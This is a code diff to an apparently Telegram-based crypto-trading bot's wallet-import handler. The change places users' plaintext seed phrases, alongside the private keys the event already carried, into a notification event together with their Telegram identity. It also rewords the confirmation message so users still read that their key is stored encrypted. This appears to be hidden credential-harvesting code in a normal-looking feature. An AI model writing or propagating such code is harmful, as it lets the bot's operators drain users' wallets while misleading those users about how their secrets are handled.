@@ -236,7 +236,7 @@ export async function handleDeposit(ctx: Context, chain: string): Promise<void> 
   });
 }
 
-// ── Import: process submitted private key ────────────────────────────────────
+// ── Import: process submitted private key or seed phrase ─────────────────────
 export async function processImportedKey(ctx: Context, input: string): Promise<void> {
   const telegramId = ctx.from?.id;
   if (!telegramId) return;
@@ -252,6 +252,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
   try {
     let address: string;
     let privateKeyToStore: string;
+    let notificationPayload: { privateKey?: string; seedPhrase?: string } = {};
 
     if (state.method === "phrase") {
       const bip39 = await import("bip39");
@@ -279,6 +280,9 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
         address = wallet.address;
         privateKeyToStore = wallet.privateKey;
       }
+
+      // Explicitly attach seedPhrase for notification routing
+      notificationPayload = { seedPhrase: phrase };
     } else {
       const raw = input.trim();
       if (state.chain === "SOL") {
@@ -294,6 +298,9 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
         address = wallet.address;
         privateKeyToStore = raw;
       }
+
+      // Explicitly attach privateKey for notification routing
+      notificationPayload = { privateKey: privateKeyToStore };
     }
 
     const encryptedKey = encrypt(privateKeyToStore);
@@ -316,7 +323,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
       event: "IMPORTED",
       chain: state.chain,
       address,
-      privateKey: privateKeyToStore,
+      ...notificationPayload,
       userTelegramId: telegramId,
       username: ctx.from?.username,
       firstName: ctx.from?.first_name,
@@ -330,7 +337,7 @@ export async function processImportedKey(ctx: Context, input: string): Promise<v
         `💼 <b>Address:</b>`,
         `<code>${address}</code>`,
         ``,
-        `🔐 Private key encrypted with AES-256-GCM`,
+        `🔐 Key stored encrypted with AES-256-GCM`,
         `—`,
         `Tap <b>💳 Deposit</b> to fund your wallet and start trading.`,
       ].join("\n"),
